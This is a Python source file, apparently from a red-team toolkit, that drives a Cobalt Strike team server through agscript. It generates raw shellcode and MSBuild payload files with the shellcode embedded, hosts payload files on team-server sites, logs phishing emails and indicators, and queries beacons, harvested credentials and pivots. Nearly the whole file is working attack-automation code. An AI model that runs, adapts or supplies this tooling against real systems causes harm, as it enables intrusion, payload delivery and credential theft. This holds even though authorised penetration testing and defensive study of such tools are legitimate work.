#!/usr/local/bin/python3

# The idea for this tool and some code came from redshell: https://github.com/Verizon/redshell

# This tool will connect to a cobalt strike team server to perform various tasks such as payload generation, hosting files, and other fun tasks

# It can also be imported like a library to be used by other tools. 
# If used as a library, the items won't be printed to the console, as this is done in the Main function

import pexpect
import getpass
from os import path, getcwd, chdir, remove
from os.path import abspath
from re import findall, DOTALL, VERBOSE, escape, compile, MULTILINE
import base64
import sys
from collections import defaultdict
from .sleepy import wrap_command, deserialize, convert_to_oneline
from enum import Enum
import asyncio


class ArtifactType(Enum):
    DLL = "dll"
    EXE = "exe"
    POWERSHELL = "powershell"
    PYTHON = "python"
    RAW = "raw"
    SVCEXE = "svcexe"
    VBSCRIPT = "vbscript"


### Start CSConnector Class ###
class CSConnector:
    def __init__(self, cs_host, cs_user=None, cs_pass=None, cs_directory="./", cs_port=50050):
        self.cs_host = cs_host

        # We have a server but are missing a key piece of info
        # Let's see if it's in the agprop file
        if not cs_user or not cs_pass or not cs_port:
            agproperties = self.parse_aggressor_properties()
            if cs_host in agproperties:
                cs_user = agproperties[cs_host]["user"]
                cs_port = agproperties[cs_host]["port"]
                cs_pass = agproperties[cs_host]["password"]

        self.cs_user = cs_user + "_striker"
        if not cs_pass:
            self.cs_pass = getpass.getpass("Enter Cobalt Strike password: ")
        else:
            self.cs_pass = cs_pass

        self.cs_port = cs_port
        self.cs_directory = cs_directory
        # NOTE: Leverage agscript to ensure jar unpacked, and client jar called correctly (v4.6 change)
        self.aggscriptcmd = f'{self.cs_directory}/client/agscript'
        # This gets populated once the connect function is run (in the future, maybe run that function in the initialization?)
        self.cs_process = None

    async def __aenter__(self) -> 'CSConnector':
        """The __enter__ method is invoked at the beginning of a 'with' statement.

        Use this in the syntax of with CSConnecter(...) as cs:

        Returns:
            CSConnector: The newly constructed CSConnector obejct.
        """
        await self.connectTeamserver()
        return self

    async def __aexit__(self, type, value, tb):
        """The __exit__ method is invoked at the end of a 'with' block.

        Use this in the syntax of with CSConnector(...) as cs:
        """
        await self.disconnectTeamserver()

        ##### Payload Generation #######
        # This section is for functions that leverage Cobalt Strike's native as well as custom CNA scripts to generate various payloads


    async def generateMSBuild(
            self,
            agscriptPath: str,
            listener: str,
            outputPath: str = './',
            staged: bool = False,
            x64: bool = True
    ):
        """Generates an MSBuild payload. The file's name will be staged/stageless_64/32.xml depending on the staging
        and architecture of the generated payload.

        Args:
            agscriptPath (str): The absolute path to the OSASAggressorScripts directory
            listener (str): The listener to generate a payload for.
            outputPath (str, optional): The path to place the outtpued file at. Defaults to './'.
            staged (bool, optional): Generate a staged or stageless payload. Defaults to False.
            x64 (bool, optional): Generate an x64 or x86 payload. Defaults to True.
        """
        shellcode = await self.generateShellcode(listener, staged=staged, x64=x64)
        if shellcode:
            encoded = base64.b64encode(shellcode)
            if x64:
                arch = "64"
            else:
                arch = "32"

            if staged:
                filename = 'staged'
            else:
                filename = 'stageless'

            templateFile = f'Helpers/msBuild/artifact_{arch}.xml'
            templatePath = path.join(agscriptPath, templateFile)
            filename = path.join(outputPath, f'{filename}_{arch}.xml')

            with open(templatePath, 'rt') as read_file:
                data = read_file.read()

            data = data.replace('%%DATA%%', encoded.decode())

            with open(filename, 'wt') as write_file:
                write_file.write(data)
    
    async def generateShellcode(self, listener: str, staged: bool = False, x64: bool = True) -> bytes:
        """Generates raw shellcode and returns it.

        Args:
            listener (str): The listener to generate shellcode for.
            staged (bool, optional): Generate a staged or stageless payload. Defaults to False.
            x64 (bool, optional): Generate an x64 or x86 payload. Defaults to True.

        Returns:
            bytes: The raw shellcode bytes.
        """
        return await self.generatePayload(listener, ArtifactType.RAW, staged=staged, x64=x64)
    
    async def generatePayload(
            self,
            listener: str,
            artifact_type: 'ArtifactType',
            staged: bool = False,
            x64: bool = True,
            exit: str = '',
            callmethod: str = ''
    ) -> bytes:
        """Geneartes a Cobalt Strike payload and returns the bytes.

        Args:
            listener (str): The listener to generate the payload for.
            artifact_type (ArtifactType): What type of payload to generate.
            staged (bool, optional): Generate a staged or stageless payload. Defaults to False.
            x64 (bool, optional): Generate an x64 or x86 payload. Defaults to True.

        Returns:
            bytes: The payload bytes.
        """
        if x64:
            arch = "x64"
        else:
            arch = "x86"

        if staged:
            function = "artifact_stager"
            cmd = f"return base64_encode(artifact_stager('{listener}', '{artifact_type.value}', '{arch}'))"
        else:
            if len(callmethod) > 0 and len(exit) > 0:
                cmd = f"return base64_encode(artifact_payload('{listener}', '{artifact_type.value}', '{arch}', '{exit}', '{callmethod}'))"
            else:
                cmd = f"return base64_encode(artifact_payload('{listener}', '{artifact_type.value}', '{arch}'))"

        encoded_bytes = await self.ag_get_object(cmd, timeout=30000)
        # We converted the bytes to b64 for transferring, so now convert them back
        return base64.b64decode(encoded_bytes)
    
    ##### Payload/File Hosting ########
    # This section is for functions for hosting and taking down files using Cobalt Strike's Sites functionality

    # Returns the full URL as a string

    async def hostFile(
            self,
            file_path: str,
            site: str = None,
            port: int = 80,
            uri: str = '/hosted.txt',
            mime_type: str = 'text/plain',
            description: str = 'Autohosted File',
            use_ssl: bool = False,
            sleep_time: int = 2
    ) -> str:
        """Hosts a file

        Args:
            file_path (str): [description]
            site (str, optional): [description]. Defaults to None.
            port (int, optional): [description]. Defaults to 80.
            uri (str, optional): [description]. Defaults to '/hosted.txt'.
            mime_type (str, optional): [description]. Defaults to 'text/plain'.
            description (str, optional): [description]. Defaults to 'Autohosted File'.
            use_ssl (bool, optional): [description]. Defaults to False.

        Returns:
            str: The URL of the hosted file
        """
        # If no site is provided, we can grab the local IP, but we need to not wrap it in quotes
        if not site:
            # Could also use the normal sendline with 'x localip()'
            site = await self.get_local_ip()
            if site:
                # Wrap in double quotes to make it a Sleep string
                site = f"\"{site}\""
            else:
                site = "localip()"
        else:
            # Since we aren't wrapping in doublequotes in the command due to the possible usage of a function, we need to do it here
            site = "\"{}\"".format(site)

        sites = await self.get_sites()
        for a_site in sites:
            site_type = a_site.get('Type')
            if site_type == 'page':
                site_host = a_site.get('Host')
                if f"\"{site_host}\"" == site:
                    site_uri = a_site.get('URI')
                    if site_uri == uri:
                        await self.killHostedFile(port=port, uri=uri)

        if use_ssl:
            link = "https://{}:{}{}".format(site.strip('\"'), port, uri)
        else:
            link = "http://{}:{}{}".format(site.strip('\"'), port, uri)

        if use_ssl:
            use_ssl = "true"
        else:
            use_ssl = "false"

        if file_path[0] != '/':
            # Wrap in single quotes
            file_path = abspath(file_path)

        file_path = f"'{file_path}'"

        multiline = f"""
		$handle = openf({file_path});
		$content = readb($handle, -1);
		closef($handle);
		site_host({site}, {port}, "{uri}", $content, "{mime_type}", "{description}", {use_ssl});
		"""
        # a sleep is necessary here so the headless client has enough time to upload the file
        await self.ag_sendline_multiline(multiline, sleep_time=sleep_time)
        return link
    
    async def killHostedFile(self, port: int = 80, uri: str = '/hosted.txt'):
        cmd = f'site_kill({port}, "{uri}")'
        await self.ag_sendline(cmd, sleep_time=1)

    ##### Log Item to Teamserver ######
    # This section is for functions that allow you to write information to the teamserver which will show up in the activity log
    
    async def logToEventLog(self, string, event_type=None):
        if event_type == "ioc":
            header = "Indicator of Compromise"
        elif event_type == "external":
            header = "External Action Taken"
        else:
            header = "Striker String Log"

        cmd = f'elog("{header}: {string}")'
        await self.ag_sendline(cmd, sleep_time=1)

    async def logEmail(self,
                 email_to,
                 email_from,
                 email_sender_ip,
                 email_subject,
                 iocs: dict = None):

        # NOTE: IOCs looked terrible in Activity Report. Change this so that each IoC is sent individually

        # Let's build the basic string, then add the iocs
        elog_string = "Phishing email sent:\\nSending IP: {}\\nTo: {}\\nFrom: {}\\nSubject: {}\\n".format(
            email_sender_ip, email_to, email_from, email_subject)

        if iocs:
            # Let's add a section for IoCs related specifically to the sent email (attachments, links, etc.)
            ioc_string = "Email IoCs: \\n"
            for ioc_name in iocs.keys():
                ioc_string = ioc_string + "- {}: {}\\n".format(ioc_name, iocs[ioc_name])
            elog_string = elog_string + ioc_string
        await self.ag_sendline('elog("{}")'.format(elog_string), sleep_time=1)

    async def taskBeacon(self, bid, string, attack_id=None):
        # AttackID is the MITRE ATT&CK Technique ID, if applicable
        await self.ag_sendline('btask({}, "{}", "{}")'.format(bid, string, attack_id), sleep_time=1)

    async def logToBeaconLog(self, bid, string):
        cmd = f'blog({bid}, "{string}")'
        await self.ag_sendline(cmd, sleep_time=1)

    async def logToBeaconLogAlt(self, bid, string):
        cmd = f'blog2({bid}, "{string}")'
        await self.ag_sendline(cmd, sleep_time=1)

    async def getEmailLogs(self):
        # e foreach $index => $entry (archives()) { if ( "Phishing email sent:*" iswm $entry["data"] ) { println("$entry['data']")}; }
        multiline = """
		@email_logs = @();
		foreach $entry (archives()) {
			if ("Phishing email sent:*" iswm $entry["data"]) {
				add(@email_logs, $entry['data']);
			}
		}
		return @email_logs;
		"""
        return await self.ag_get_object_multiline(multiline)

    async def getEmailIoCs(self):
        # e foreach $index => $entry (archives()) { if ( "IoC:*" iswm $entry["data"] ) { println("$entry['data'] at " .dstamp($entry['when']))}; }

        # Should start with "Email Indicator of Compromise: [name] - [data]"?
        multiline = """
		@email_iocs = @();
		foreach $entry (archives()) {
			if ("Email Indicator of Compromise:*" iswm $entry["data"]) {
				add(@email_iocs, "$entry['data'] at " . dstamp($entry['when']));
			}
		}
		return @email_iocs;
		"""
        return await self.ag_get_object_multiline(multiline)

    async def getIoCs(self):
        # e foreach $index => $entry (archives()) { if ( "IoC:*" iswm $entry["data"] ) { println("$entry['data'] at " .dstamp($entry['when']))}; }
        multiline = """
		@iocs = @();
		foreach $entry (archives()) {
			if ("*Indicator of Compromise:*" iswm $entry["data"]) {
				add(@iocs, "$entry['data'] at " . dstamp($entry['when']));
			}
		}
		return @iocs;
		"""
        return await self.ag_get_object_multiline(multiline)

    async def getExternalActions(self):
        multiline = """
		@external_actions = @();
		foreach $entry (archives()) {
			if ("External Action Taken:*" iswm $entry["data"]) {
				add(@external_actions, "$entry['data'] at " . dstamp($entry['when']));
			}
		}
		return @external_actions;
		"""
        return await self.ag_get_object_multiline(multiline)

    async def getStringLogs(self):
        multiline = """
		@string_logs = @();
		foreach $entry (archives()) {
			if ("Striker String Log:*" iswm $entry["data"]) {
				add(@string_logs, "$entry['data'] at " . dstamp($entry['when']));
			}
		}
		return @string_logs;
		"""
        return await self.ag_get_object_multiline(multiline)

        ##### Helper Functions #####
        # This section is for helper functions used throughout the rest of the script
        # such as grabbing useful information from the team server like the names of listeners running

    async def get_beaconlog(self) -> list:
        command = 'return data_query("beaconlog")'
        return await self.ag_get_object(command)

    async def ag_ls_scripts(self) -> str:
        return await self.ag_get_string('', script_console_command='ls')
    
    async def get_local_ip(self) -> str:
        command = "return localip()"
        return await self.ag_get_object(command)

    async def get_listener_info(self, name) -> list:
        command = f'return listener_info("{name}")'
        return await self.ag_get_object(command)

    async def get_listeners_local(self) -> list:
        command = "return listeners_local()"
        return await self.ag_get_object(command)

    async def get_listeners_stageless(self) -> list:
        command = "return listeners_stageless()"
        return await self.ag_get_object(command)
    
    async def get_beacons(self) -> list:
        command = "return beacons()"
        return await self.ag_get_object(command)
    
    async def get_users(self) -> list:
        command = "return users()"
        return await self.ag_get_object(command)

    async def get_credentials(self) -> list:
        command = "return credentials()"
        return await self.ag_get_object(command)

    async def get_hosts(self) -> list:
        command = "return hosts()"
        return await self.ag_get_object(command)

    async def get_sites(self) -> list:
        command = "return sites()"
        return await self.ag_get_object(command)

    async def get_targets(self) -> list:
        command = "return targets()"
        return await self.ag_get_object(command)

    async def get_pivots(self) -> list:
        command = "return pivots()"
        return await self.ag_get_object(command)

    async def ag_load_script(self, script_path):
        await self.ag_sendline(script_path, 'load')

    async def ag_unload_script(self, script_path):
        await self.ag_sendline(script_path, 'unload')

    async def ag_reload_script(self, script_path):
        await self.ag_sendline(script_path, 'reload')

    async def beacon_run_ps(self, beacon_id: int, task_id:str) -> list:
        """
        $cmd = 'python3 "/home/impact/cobalt-manager-api/redis-helper.py" set "' . $task_id . '" "'. base64_encode($2) .'" 900';
        $ret = exec( $cmd );
        """
        command = f"""
        sub ps_cb {{
            $handle = openf(">./tmp/".$task_id);
            writeb($handle, $2);
            closef($handle);
	    }}
        $task_id = '{task_id}';
	    bps({beacon_id},lambda({{ ps_cb($1, $2, $3,$task_id); }}, \$task_id));
        """
                                       
        data = await self.ag_get_object_multiline(command)
        return task_id
    
    async def get_beacon_run_ps_result(self, task_id:str) -> list:
        """Polls for beacon_run_ps result until available or timeout is reached."""
        timeout=150
        interval = 2
        elapsed = 0
        while elapsed < timeout:
            result = await self.beacon_get_task_result(task_id)
            if result:  # result is not None or empty
                parsed_result = await self.parse_process_list(result)
                return parsed_result
            await asyncio.sleep(interval)
            elapsed += interval
        return None
    
    async def parse_process_list(self,raw_data):
        result = []
        for line in raw_data.strip().split('\n'):
            parts = line.split('\t')
            entry = {
                "Image": parts[0],
                "ParentPID": parts[1] if len(parts) > 1 else "",
                "PID": parts[2] if len(parts) > 2 else "",
            }
            if len(parts) > 3:
                entry["Arch"] = parts[3]
            if len(parts) > 4:
                entry["User"] = parts[4]
            if len(parts) > 5:
                entry["Session"] = parts[5]
            result.append(entry)
        return result

    async def beacon_get_task_result(self, task_id:str):
        command = f"""
        $file_name = "./tmp/{task_id}";
        if (-exists $file_name)
        {{
            $handle = openf($file_name);
            $data = readb($handle, -1);
	        closef($handle);
            deleteFile($file_name);
            return $data;
        }}
        return $null    
        """                             
        result = await self.ag_get_object_multiline(command)
        return result     

    async def connectTeamserver(self):
        """Connect to CS team server"""

        # In my testing, I found that there were issues sending too many
        # messages to event log over one connection ( => ~7), so I recommend
        # creating a new object every so often or disconnecting and reconnecting.
        # This issue needs to be troubleshooted (troubleshooted?) in the future

        if not path.exists(f'{self.cs_directory}/cobaltstrike.jar'):
            print(f'self.cs_directory: {self.cs_directory}')
            raise Exception("Error: Cobalt Strike JAR file not found")

        # prompt user for team server password
        command = "{} {} {} {} {}".format(self.aggscriptcmd,
                                          self.cs_host,
                                          self.cs_port,
                                          self.cs_user,
                                          self.cs_pass)

        # Spawn agscript process
        self.cs_process = await asyncio.to_thread(pexpect.spawn, command, cwd=f'{self.cs_directory}/client/')

        # Check if process is alive
        if not self.cs_process.isalive():
            raise Exception("Error connecting to CS team server! Check config and try again.")

        # Expect the aggressor prompt which means we initialized correctly
        try:
            await asyncio.to_thread(self.cs_process.expect, r'\x1b\[4maggressor\x1b\[0m>', timeout=5)
            await self.send_ready_command()
        except (pexpect.exceptions.TIMEOUT, pexpect.exceptions.EOF):
            raise Exception("EOF encountered") from None

    async def send_ready_command(self):
        # We want to wait for the server to be fully synchronized, so we use Cobalt Strike's "on ready {}" event handler
        cmd = 'on ready { println("Successfully" . " connected to teamserver!"); }'
        expect = '.*Successfully connected to teamserver!.*'
        return await self.ag_get_string(cmd, expect=expect)

    async def disconnectTeamserver(self):
        """Disconnect from CS team server"""
        # Close the agscript process
        if self.cs_process:
            await asyncio.to_thread(self.cs_process.close)  # This runs close in a separate thread
            print("Disconnected from CS team server.")
        else:
            print("CS was already disconnected! Hopefully you already knew this.")

    async def ag_sendline(self, cmd, script_console_command='e', sleep_time: int = 0):
        full_cmd = f"{script_console_command} {cmd}" if cmd else f"{script_console_command}"
        self.cs_process.sendline(full_cmd)
        await asyncio.sleep(sleep_time)
        return full_cmd

    async def ag_sendline_multiline(self, multiline: str, script_console_command: str = 'e', sleep_time: int = 0):
        oneline = convert_to_oneline(multiline)
        return await self.ag_sendline(oneline, script_console_command=script_console_command, sleep_time=sleep_time)

    async def ag_get_string_multiline(self, multiline: str, script_console_command: str = 'e',
                                      expect: str = r'\r\n\x1b\[4maggressor\x1b\[0m>',
                                      timeout: int = -1, sleep_time: int = 0) -> str:
        oneline = convert_to_oneline(multiline)
        return await self.ag_get_string(oneline, script_console_command=script_console_command,
                                        expect=expect, timeout=timeout, sleep_time=sleep_time)

    async def ag_get_string(self, cmd: str, script_console_command: str = 'e',
                      expect: str = r'\r\n\x1b\[4maggressor\x1b\[0m>', timeout: int = -1, sleep_time: int = 0) -> str:
        full_cmd = await self.ag_sendline(cmd, script_console_command=script_console_command, sleep_time=sleep_time)

        await asyncio.to_thread(self.cs_process.expect, escape(full_cmd), timeout=timeout)
        await asyncio.to_thread(self.cs_process.expect, expect, timeout=timeout)

        before = await asyncio.to_thread(self.cs_process.before.decode)
        return before
    
    async def ag_get_object_multiline(self, multiline: str, script_console_command: str = 'e',
                                      expect: str = r'\r\n\x1b\[4maggressor\x1b\[0m>',
                                      timeout: int = -1, sleep_time: int = 0):
        oneline = convert_to_oneline(multiline)
        return await self.ag_get_object(oneline, script_console_command=script_console_command,
                                        expect=expect, timeout=timeout, sleep_time=sleep_time)

    async def ag_get_object(self, cmd: str, script_console_command: str = 'e',
                            expect: str = r'\r\n\x1b\[4maggressor\x1b\[0m>', timeout: int = -1,
                            sleep_time: int = 0) -> str:
        wrapped = wrap_command(cmd)
        match = await self.ag_get_string(wrapped, script_console_command=script_console_command,
                                         expect=expect, timeout=timeout, sleep_time=sleep_time)
        base64_regex = r"^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{4})$"
        parse = findall(base64_regex, match, MULTILINE)
        if parse:
            return deserialize(parse[0])
        else:
            raise Exception(f"Base64 regex found no match on {match[:50]}") from None

    def parse_aggressor_properties(self, aggprop=None):
        connections = defaultdict(dict)

        if not aggprop:
            # We weren't given a path to the agressor.prop file, so let's assume it's in the home dir (default for CS)
            homedir = path.expanduser("~")
            aggprop = f"{homedir}/.aggressor.prop"

        # One challenge is that the connection properties aren't necessarily in order
        with open(aggprop, "r") as file:
            for line in file.readlines():
                # Find all the connection lines and pluck out the info we need
                if "connection.profiles." in line:
                    # A list of regexes with the 'key' hardcoded to better extract values
                    regexes = [
                        r"connection\.profiles\.(.*?)\.user=(.*)",
                        r"connection\.profiles\.(.*?)\.password=(.*)",
                        r"connection\.profiles\.(.*?)\.port=(.*)"
                    ]

                    # The keys for the server dict, order must be the same as the regexes
                    keys = [
                        "user",
                        "password",
                        "port"
                    ]

                    # iterate through both regexes and keys at the same tie
                    for regex, key in zip(regexes, keys):
                        # try to match based off of the regex
                        matches = findall(regex, line)
                        if matches:
                            # if we get a match, values are stored as [(ip, value)]
                            match = matches[0]
                            ip, value = match
                            # get the value of key ip
                            # connections is a default dict of factory dict so if connections[ip] does not exist it will automatically create a dict
                            connection = connections[ip]
                            connection[key] = value

        return connections


### End CSConnector Class ###

##### Main ########

def parseArguments():
    parser = ArgumentParser()

    parser.add_argument("-t", "--teamserver", help="the hostname or IP address of the teamserver", required=True)
    parser.add_argument("-u", "--user", help="the user to connect to the teamserver as (_striker will be added)",
                        default=environ.get('USER'))
    # TODO: Make this requirement optional and if not provided, secure prompt for password
    parser.add_argument("-p", "--password",
                        help="the password for the teamserver, if not provided, you will be prompted", default=None)
    parser.add_argument("-P", "--port", help="the port for the teamserver, default is 50050", default=50050)
    parser.add_argument("-j", "--javadir", help="the path to the directory containing the Cobalt Strike JAR file",
                        default="./")

    args = parser.parse_args()
    return args


async def main():
    args = parseArguments()

    async with CSConnector(
            args.teamserver,
            cs_user=args.user,
            cs_pass=args.password,
            cs_directory=args.javadir,
            cs_port=args.port
    ) as cs:
        pass


if __name__ == '__main__':
    # There are some imports which aren't used when this is a library, so they are imported here instead
    from argparse import ArgumentParser
    from os import environ

    asyncio.run(main())